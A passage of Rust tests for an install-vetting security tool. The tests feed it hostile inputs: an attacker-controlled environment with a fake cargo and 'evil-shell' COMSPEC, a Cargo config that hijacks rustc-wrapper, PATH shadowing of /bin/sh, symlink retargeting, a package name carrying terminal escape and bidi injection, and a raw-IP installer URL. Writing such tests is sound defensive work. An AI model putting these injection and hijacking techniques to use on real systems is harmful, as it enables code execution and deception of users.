            for name in ["TMPDIR", "TMP", "TEMP", "TEMPDIR"] {
                assert_eq!(
                    command_env(&command, name).as_deref(),
                    Some(environment.private_temp.path().to_string_lossy().as_ref())
                );
            }
            for name in [
                "USERPROFILE",
                "APPDATA",
                "LOCALAPPDATA",
                "SystemRoot",
                "WINDIR",
                "COMSPEC",
                "PATHEXT",
                "NoDefaultCurrentDirectoryInExePath",
            ] {
                assert!(command_env(&command, name).is_none());
            }
            return;
        }

        // A subprocess supplies a genuinely hostile ambient environment before
        // capture without mutating this parallel test process. This is stronger
        // isolation than a process-global ENV_LOCK and cannot race other tests.
        use std::os::unix::fs::PermissionsExt as _;

        // Put both attacker-controlled roots under the conventional OS temp
        // boundary. The child deliberately redirects every temp selector to
        // `attacker_temp`, so a default `tempfile::tempdir()` rooted in the
        // parent test harness's custom TMPDIR would be unknowable to the child.
        // `/tmp` remains independently denied even under that split-root
        // environment, which exercises the production fail-closed policy.
        let attacker_path = tempfile::Builder::new()
            .prefix("tirith-install-attacker-path-")
            .tempdir_in("/tmp")
            .unwrap();
        let attacker_temp = tempfile::Builder::new()
            .prefix("tirith-install-attacker-temp-")
            .tempdir_in("/tmp")
            .unwrap();
        std::fs::create_dir(attacker_path.path().join("bin")).unwrap();
        let fake_cargo = attacker_path.path().join("bin/cargo");
        std::fs::write(&fake_cargo, "#!/bin/sh\nexit 0\n").unwrap();
        std::fs::set_permissions(&fake_cargo, std::fs::Permissions::from_mode(0o755)).unwrap();
        let test_name = std::thread::current().name().unwrap().to_string();
        let mut child = Command::new(std::env::current_exe().unwrap());
        child
            .env_clear()
            .arg("--exact")
            .arg(test_name)
            .arg("--nocapture")
            .env(CHILD_MARKER, "1")
            .env(ATTACKER_PATH_ROOT, attacker_path.path())
            .env(ATTACKER_TEMP_ROOT, attacker_temp.path())
            .env("HOME", attacker_path.path())
            .env("USERPROFILE", attacker_path.path())
            .env("APPDATA", attacker_path.path())
            .env("LOCALAPPDATA", attacker_path.path())
            .env("TMPDIR", attacker_temp.path())
            .env("TMP", attacker_temp.path())
            .env("TEMP", attacker_temp.path())
            .env("TEMPDIR", attacker_temp.path())
            .env("SystemRoot", attacker_path.path())
            .env("WINDIR", attacker_path.path())
            .env("COMSPEC", attacker_path.path().join("evil-shell"))
            .env("PATHEXT", ".EVIL")
            .env("PATH", attacker_path.path().join("bin"));
        let output = child.output().unwrap();
        assert!(
            output.status.success(),
            "hostile-environment child failed\nstdout:\n{}\nstderr:\n{}",
            String::from_utf8_lossy(&output.stdout),
            String::from_utf8_lossy(&output.stderr)
        );
    }

    #[test]
    fn analysis_only_source_binding_does_not_require_runtime_state() {
        let directory = tempfile::tempdir().unwrap();
        let binding = InstallSourceBinding::capture_analysis_only(
            PackageManager::Cargo,
            Some(directory.path()),
            &["demo@1.0.0".to_string()],
        )
        .unwrap();
        assert!(binding.execution_environment.is_none());
        assert!(binding.isolated.is_none());
        assert!(binding.cargo_install_root.is_none());
        assert!(!binding.cargo_isolated_cwd);
    }

    #[test]
    fn cargo_output_paths_are_bound_before_isolating_project_build_config() {
        let directory = tempfile::tempdir().unwrap();
        std::fs::create_dir(directory.path().join(".cargo")).unwrap();
        std::fs::write(
            directory.path().join(".cargo/config.toml"),
            "[build]\nrustc-wrapper = './evil-wrapper'\n",
        )
        .unwrap();
        let args = bind_cargo_output_paths(
            &[
                "demo@=1.0.0".to_string(),
                "--root".to_string(),
                "out".to_string(),
                "--target-dir=target-out".to_string(),
            ],
            directory.path(),
        )
        .unwrap();
        assert_eq!(args[2], directory.path().join("out").display().to_string());
        assert_eq!(
            args[3],
            format!(
                "--target-dir={}",
                directory.path().join("target-out").display()
            )
        );
        assert!(
            !cargo_args_require_original_cwd(&args),
            "output-only flags must not expose project Cargo config"
        );

        let binding =
            InstallSourceBinding::capture(PackageManager::Cargo, Some(directory.path()), &args)
                .unwrap();
        assert!(binding.cargo_isolated_cwd);
        let expected_cwd = binding.isolated.as_ref().unwrap().path().join("cargo-work");
        let mut command = Command::new("cargo");
        binding.configure_command(&mut command);
        assert_eq!(command.get_current_dir(), Some(expected_cwd.as_path()));
        assert_ne!(command.get_current_dir(), Some(directory.path()));

        assert!(cargo_args_require_original_cwd(&[
            "demo".to_string(),
            "--path=local-crate".to_string()
        ]));
        assert!(cargo_args_require_original_cwd(&[
            "demo".to_string(),
            "--config=alternate.toml".to_string()
        ]));
    }

    #[test]
    #[cfg(unix)]
    fn pathname_script_replacement_is_rejected_before_launch() {
        use std::os::unix::fs::PermissionsExt as _;

        let directory = tempfile::tempdir().unwrap();
        let path = directory.path().join("manager");
        std::fs::write(&path, b"#!/bin/sh\nexit 0\n").unwrap();
        std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o755)).unwrap();
        let trusted =
            tirith_core::trusted_child::TrustedExecutable::from_absolute(&path, &[]).unwrap();
        let canonical = trusted.path().to_path_buf();
        let binding = InstallExecutableBinding::from_trusted_for_test(trusted).unwrap();
        let program = path.to_str().unwrap();
        binding
            .verify_program_with_denied(program, &[])
            .expect("unchanged executable identity must verify");

        std::fs::write(&canonical, b"#!/bin/sh\nexit 99\n").unwrap();
        std::fs::set_permissions(&canonical, std::fs::Permissions::from_mode(0o755)).unwrap();
        let error = binding
            .verify_program_with_denied(program, &[])
            .expect_err("replacement at the approved script path must fail");
        assert!(error.to_string().contains("changed"), "{error}");
    }

    #[test]
    #[cfg(unix)]
    fn normal_user_managed_manager_is_safely_bound() {
        use std::os::unix::fs::PermissionsExt as _;

        let global = crate::cli::test_harness::ENV_LOCK
            .lock()
            .unwrap_or_else(|error| error.into_inner());
        let account_home = global
            .previous_env("HOME")
            .map(Path::new)
            .expect("test account HOME");
        let directory = tempfile::Builder::new()
            .prefix("tirith-user-install-manager-")
            .tempdir_in(account_home)
            .unwrap();
        let bin = directory.path().join("bin");
        std::fs::create_dir(&bin).unwrap();
        let manager = bin.join("cargo");
        std::fs::write(&manager, b"#!/bin/sh\nexit 0\n").unwrap();
        std::fs::set_permissions(&manager, std::fs::Permissions::from_mode(0o755)).unwrap();

        let user_path = std::env::join_paths([bin.as_path()]).expect("test PATH is representable");
        let binding = InstallExecutableBinding::resolve_on_path("cargo", &user_path)
            .expect("a validated user-managed package manager must be supported");
        assert_eq!(binding.path(), manager);
        binding
            .verify_program_with_denied(manager.to_str().unwrap(), &[])
            .expect("the safely bound user manager must revalidate");
        #[cfg(target_os = "linux")]
        assert!(
            binding.trusted.bound_launch_fd().is_none(),
            "a user-managed shebang entrypoint must retain pathname semantics"
        );
    }

    #[test]
    #[cfg(unix)]
    fn writable_path_shadow_of_system_executable_is_rejected() {
        use std::os::unix::fs::PermissionsExt as _;

        let global = crate::cli::test_harness::ENV_LOCK
            .lock()
            .unwrap_or_else(|error| error.into_inner());
        let account_home = global
            .previous_env("HOME")
            .map(Path::new)
            .expect("test account HOME");
        let directory = tempfile::Builder::new()
            .prefix("tirith-install-manager-shadow-")
            .tempdir_in(account_home)
            .unwrap();
        let bin = directory.path().join("bin");
        std::fs::create_dir(&bin).unwrap();
        let manager = bin.join("sh");
        std::fs::write(&manager, b"#!/bin/sh\nexit 0\n").unwrap();
        std::fs::set_permissions(&manager, std::fs::Permissions::from_mode(0o755)).unwrap();

        let before_system = std::env::join_paths([bin.as_path(), Path::new("/bin")])
            .expect("test PATH is representable");
        let error = InstallExecutableBinding::resolve_on_path("sh", &before_system)
            .expect_err("a writable first hit that shadows /bin/sh must be rejected");
        assert_eq!(error.kind(), std::io::ErrorKind::PermissionDenied);
        assert!(error
            .to_string()
            .contains("shadows later trusted system executable /bin/sh"));
    }

    #[test]
    #[cfg(target_os = "linux")]
    fn shebang_manager_can_load_sibling_relative_resources() {
        use std::os::unix::fs::PermissionsExt as _;

        let global = crate::cli::test_harness::ENV_LOCK
            .lock()
            .unwrap_or_else(|error| error.into_inner());
        let account_home = global
            .previous_env("HOME")
            .map(Path::new)
            .expect("test account HOME");
        let directory = tempfile::Builder::new()
            .prefix("tirith-shebang-manager-")
            .tempdir_in(account_home)
            .unwrap();
        let bin = directory.path().join("bin");
        let lib = directory.path().join("lib");
        std::fs::create_dir(&bin).unwrap();
        std::fs::create_dir(&lib).unwrap();
        std::fs::write(lib.join("value.txt"), b"sibling-resource\n").unwrap();
        let manager = bin.join("manager");
        std::fs::write(
            &manager,
            b"#!/bin/sh\nscript_dir=${0%/*}\nIFS= read -r value < \"$script_dir/../lib/value.txt\"\nprintf '%s' \"$value\"\n",
        )
        .unwrap();
        std::fs::set_permissions(&manager, std::fs::Permissions::from_mode(0o755)).unwrap();

        let trusted =
            tirith_core::trusted_child::TrustedExecutable::from_absolute(&manager, &[]).unwrap();
        let binding = InstallExecutableBinding::from_trusted(trusted).unwrap();
        assert!(binding.trusted.bound_launch_fd().is_none());
        let source_binding = InstallSourceBinding::capture(
            PackageManager::Cargo,
            Some(directory.path()),
            &["demo".to_string()],
        )
        .unwrap();
        let output = ProcessInstallRunner {
            executable: &binding,
            source_binding: &source_binding,
        }
        .run(manager.to_str().unwrap(), &[], true)
        .unwrap();

        assert_eq!(output.exit_code, Some(0));
        assert_eq!(output.stdout.as_deref(), Some("sibling-resource"));
    }

    #[test]
    #[cfg(target_os = "linux")]
    fn executable_binding_preserves_multicall_invocation_without_following_retargeting() {
        use std::os::unix::fs::{symlink, PermissionsExt as _};

        let directory = tempfile::Builder::new()
            .prefix("tirith-install-multicall-")
            .tempdir_in(trusted_account_home().expect("OS account home"))
            .unwrap();
        let rustup = PathBuf::from("/bin/sh").canonicalize().unwrap();
        let cargo = directory.path().join("cargo");
        symlink(&rustup, &cargo).unwrap();

        let trusted =
            tirith_core::trusted_child::TrustedExecutable::from_absolute(&cargo, &[]).unwrap();
        let canonical = rustup.canonicalize().unwrap();
        let binding = InstallExecutableBinding::from_trusted_for_test(trusted).unwrap();
        assert_eq!(binding.path(), cargo);
        assert_eq!(binding.canonical_path, canonical);
        binding
            .verify_program_with_denied(cargo.to_str().unwrap(), &[])
            .expect("the unchanged selected proxy and target must verify");

        let source_binding = InstallSourceBinding::capture(
            PackageManager::Cargo,
            Some(directory.path()),
            &["demo".to_string()],
        )
        .unwrap();
        let runner = ProcessInstallRunner {
            executable: &binding,
            source_binding: &source_binding,
        };
        let output = runner
            .run(
                cargo.to_str().unwrap(),
                &["-c".to_string(), "printf '%s' \"${0##*/}\"".to_string()],
                true,
            )
            .unwrap();
        assert_eq!(output.exit_code, Some(0));
        assert_eq!(output.stdout.as_deref(), Some("cargo"));

        let replacement = directory.path().join("replacement");
        std::fs::write(&replacement, b"#!/bin/sh\nprintf replacement\n").unwrap();
        std::fs::set_permissions(&replacement, std::fs::Permissions::from_mode(0o755)).unwrap();
        std::fs::remove_file(&cargo).unwrap();
        symlink(&replacement, &cargo).unwrap();
        binding
            .verify_program_with_denied(cargo.to_str().unwrap(), &[])
            .expect("retargeting argv[0] metadata cannot change the retained launch identity");
        let output = runner
            .run(
                cargo.to_str().unwrap(),
                &["-c".to_string(), "printf '%s' \"${0##*/}\"".to_string()],
                true,
            )
            .unwrap();
        assert_eq!(output.exit_code, Some(0));
        assert_eq!(output.stdout.as_deref(), Some("cargo"));
    }

    #[test]
    #[cfg(unix)]
    fn executable_binding_rejects_unsealed_script_proxy_retargeting() {
        use std::os::unix::fs::{symlink, PermissionsExt as _};

        let directory = tempfile::Builder::new()
            .prefix("tirith-install-script-proxy-")
            .tempdir_in(trusted_account_home().expect("OS account home"))
            .unwrap();
        let original = directory.path().join("original");
        let replacement = directory.path().join("replacement");
        for path in [&original, &replacement] {
            std::fs::write(path, b"#!/bin/sh\nexit 0\n").unwrap();
            std::fs::set_permissions(path, std::fs::Permissions::from_mode(0o755)).unwrap();
        }
        let cargo = directory.path().join("cargo");
        symlink(&original, &cargo).unwrap();

        let trusted =
            tirith_core::trusted_child::TrustedExecutable::from_absolute(&cargo, &[]).unwrap();
        let binding = InstallExecutableBinding::from_trusted_for_test(trusted).unwrap();
        binding
            .verify_program_with_denied(cargo.to_str().unwrap(), &[])
            .expect("the unchanged script proxy and target must verify");

        std::fs::remove_file(&cargo).unwrap();
        symlink(&replacement, &cargo).unwrap();
        let error = binding
            .verify_program_with_denied(cargo.to_str().unwrap(), &[])
            .expect_err("an unsealed script proxy retarget must fail closed");
        assert!(error.to_string().contains("different path"), "{error}");
    }

    #[test]
    fn install_human_display_strips_osc_bidi_controls_and_row_injection() {
        let hostile_name = concat!(
            "pkgSTART",
            "\x1b[31m",
            "\x1b]52;c;aGVsbG8=\x07",
            "\u{202e}",
            "\u{200b}",
            "\x08",
            "\rFORGED\n",
            "ENDvis",
        );
        let argv = InstallArgv {
            program: "npm".to_string(),
            args: vec!["install".to_string(), hostile_name.to_string()],
        };
        let raw = argv.display();
        assert!(raw.contains('\x1b'));
        assert!(raw.contains('\u{202e}'));
        assert!(raw.contains('\n'));
        assert_eq!(argv.args[1], hostile_name, "structured argv stays lossless");

        for rendered in [
            install_command_for_human(&argv),
            install_value_for_human(hostile_name),
        ] {
            for forbidden in ['\x1b', '\x07', '\x08', '\r', '\n', '\u{202e}', '\u{200b}'] {
                assert!(
                    !rendered.contains(forbidden),
                    "U+{:04X} survived in {rendered:?}",
                    forbidden as u32,
                );
            }
            assert!(rendered.contains("pkgSTART"));
            assert!(rendered.contains("ENDvis"));
            assert_eq!(rendered.lines().count(), 1);
        }
    }

    #[test]
    fn decide_proceed_allow_goes() {
        let policy = Policy::default();
        assert!(matches!(
            decide_proceed(&allow_verdict(), &policy, false, false, true),
            ProceedDecision::Go
        ));
    }

    #[test]
    fn decide_proceed_block_stops_with_exit_1() {
        let policy = Policy::default();
        assert!(matches!(
            decide_proceed(&block_verdict(), &policy, true, false, true),
            ProceedDecision::Stop(1)
        ));
    }

    #[test]
    fn decide_proceed_warn_noninteractive_stops_without_yes() {
        let policy = Policy::default();
        assert!(matches!(
            decide_proceed(&warn_verdict(), &policy, false, false, true),
            ProceedDecision::Stop(2)
        ));
    }

    #[test]
    fn decide_proceed_warn_with_yes_goes() {
        let policy = Policy::default();
        assert!(matches!(
            decide_proceed(&warn_verdict(), &policy, false, true, true),
            ProceedDecision::Go
        ));
    }

    #[test]
    fn fake_runner_records_argv_and_never_spawns() {
        let req_args = vec!["my-pkg".to_string()];
        let argv = install_txn::build_argv(PackageManager::Npm, &req_args);
        let plan = InstallPlan {
            manager: PackageManager::Npm,
            argv: argv.clone(),
            analysis_command: argv.display(),
            packages: vec![],
            verdict: allow_verdict(),
            notes: vec![],
            coverage: Default::default(),
        };
        let runner = FakeRunner::new(Some(0));
        let compiled = tirith_core::redact::CompiledCustomPatterns::new_silent(&[]);
        // cwd=None so no checkpoint (hermetic); json=true exercises the capture path.
        let code = run_and_record(&plan, None, true, false, &runner, &compiled);
        assert_eq!(code, 0);
        let seen = runner.seen.lock().unwrap();
        assert_eq!(seen.len(), 1, "the runner must be called exactly once");
        assert_eq!(seen[0].0, "npm");
        assert_eq!(seen[0].1, vec!["install", "my-pkg"]);
        assert!(
            seen[0].2,
            "JSON mode must request capture so child output is embedded"
        );
    }

    #[test]
    fn fake_runner_propagates_nonzero_exit() {
        let req_args = vec!["my-pkg".to_string()];
        let argv = install_txn::build_argv(PackageManager::Cargo, &req_args);
        let plan = InstallPlan {
            manager: PackageManager::Cargo,
            argv: argv.clone(),
            analysis_command: argv.display(),
            packages: vec![],
            verdict: allow_verdict(),
            notes: vec![],
            coverage: Default::default(),
        };
        let runner = FakeRunner::new(Some(17));
        let compiled = tirith_core::redact::CompiledCustomPatterns::new_silent(&[]);
        let code = run_and_record(&plan, None, true, false, &runner, &compiled);
        assert_eq!(code, 17, "the install's own exit code must propagate");
    }

    #[test]
    fn fake_runner_signal_termination_is_failure() {
        let argv = install_txn::build_argv(PackageManager::Pip, &["x".to_string()]);
        let plan = InstallPlan {
            manager: PackageManager::Pip,
            argv: argv.clone(),
            analysis_command: argv.display(),
            packages: vec![],
            verdict: allow_verdict(),
            notes: vec![],
            coverage: Default::default(),
        };
        let runner = FakeRunner::new(None); // signal-terminated → no code
        let compiled = tirith_core::redact::CompiledCustomPatterns::new_silent(&[]);
        let code = run_and_record(&plan, None, true, false, &runner, &compiled);
        assert_eq!(code, 1);
    }

    #[test]
    fn json_mode_emits_single_parseable_envelope() {
        // PR #121 fix-list item 3 regression pin — JSON mode must request capture
        // so child output lands INSIDE the single envelope. We can't observe
        // stdout cleanly here, so we assert the runner is called with capture=true.
        let req_args = vec!["clean-pkg".to_string()];
        let argv = install_txn::build_argv(PackageManager::Pip, &req_args);
        let plan = InstallPlan {
            manager: PackageManager::Pip,
            argv: argv.clone(),
            analysis_command: argv.display(),
            packages: vec![],
            verdict: allow_verdict(),
            notes: vec![],
            coverage: Default::default(),
        };
        let runner = FakeRunner::new(Some(0))
            .with_capture("installing clean-pkg\nDone.\n", "warning: deprecated\n");
        let compiled = tirith_core::redact::CompiledCustomPatterns::new_silent(&[]);
        let _code = run_and_record(
            &plan, None, /* json = */ true, false, &runner, &compiled,
        );
        let seen = runner.seen.lock().unwrap();
        assert_eq!(seen.len(), 1);
        assert!(
            seen[0].2,
            "JSON mode must request capture; saw capture={}",
            seen[0].2,
        );
    }

    #[test]
    fn detect_manifest_flag_helper_is_internal() {
        // CLI-side smoke that the core's manifest detector fires through
        // `plan_install`; real coverage lives in `tirith-core::install_txn::tests`.
        let req = tirith_core::install_txn::PlanRequest {
            manager: PackageManager::Pip,
            user_args: &["-r".to_string(), "requirements.txt".to_string()],
            db: None,
            policy: &Policy::default(),
            cwd: None,
            interactive: false,
            online: tirith_core::install_txn::OnlineMode::Off,
        };
        let plan = tirith_core::install_txn::plan_install(&req);
        assert!(
            plan.verdict
                .findings
                .iter()
                .any(|f| f.title.contains("manifest install")),
            "the manifest-bypass finding must surface from the CLI's plan_install \
             call too: {:?}",
            plan.verdict.findings,
        );
    }

    #[test]
    fn preflight_url_plain_installer_does_not_block() {
        // A plain https installer URL, analyzed as a download, must not block.
        let (verdict, _policy) =
            preflight_url("https://get.example-tool.sh/install.sh", None, false);
        assert_ne!(
            verdict.action,
            Action::Block,
            "a download-shaped preflight must not block a plain installer URL: {:?}",
            verdict.findings,
        );
    }

    #[test]
    fn preflight_url_raw_ip_is_flagged() {
        // A raw-IP URL is suspicious; the preflight should surface it (raw_ip_url).
        let (verdict, _policy) = preflight_url("http://203.0.113.5/install.sh", None, false);
        assert!(
            verdict.action != Action::Allow,
            "a raw-IP install URL should raise at least one finding"
        );
    }

    #[test]
    fn shell_single_quote_escapes_metacharacters() {
        // CR10: a URL with shell metacharacters becomes one quoted token.
        assert_eq!(
            shell_single_quote("https://x.example/a?b=1&c=2"),
            "'https://x.example/a?b=1&c=2'"
        );
        // An embedded single quote is closed/escaped/reopened.
        assert_eq!(shell_single_quote("a'b"), "'a'\\''b'");
    }

    #[test]
    fn preflight_url_with_shell_metacharacters_no_spurious_findings() {
        // CR10: a benign URL with `&`/`;`/space must not produce shell-syntax
        // findings once quoted into `curl -fsSL '<url>'`.
        let url = "https://get.example-tool.sh/install.sh?ref=a&v=1;x y";
        let (verdict, _policy) = preflight_url(url, None, false);
        assert_eq!(
            verdict.action,
            Action::Allow,
            "a quoted benign installer URL must not raise shell-syntax findings: {:?}",
            verdict.findings,
        );
    }

    #[test]
    fn preflight_url_quoting_preserves_real_detection() {
        // Quoting must not hide a raw-IP URL that also carries shell metacharacters.
        let (verdict, _policy) =
            preflight_url("http://203.0.113.5/install.sh?a=1&b=2", None, false);
        assert!(
            verdict.action != Action::Allow,
            "quoting must not suppress a raw-IP finding"
        );
    }
}
